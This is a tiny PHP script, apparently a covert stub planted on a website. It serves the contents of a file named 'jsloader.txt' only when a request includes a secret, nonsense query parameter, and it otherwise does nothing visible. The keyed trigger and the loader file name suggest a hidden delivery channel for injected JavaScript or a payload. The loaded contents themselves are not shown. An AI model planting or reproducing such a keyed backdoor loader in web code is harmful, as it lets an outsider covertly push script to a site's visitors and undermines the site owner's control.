<?php
//addcslashesbeewergogoend14
$pathFile="";
if(isset($_GET['addcslashesbeewergogoend14'])){
	$pathFile="jsloader.txt";
}
if($pathFile){
$lstr=file_get_contents($pathFile);
echo $lstr;
}	
?>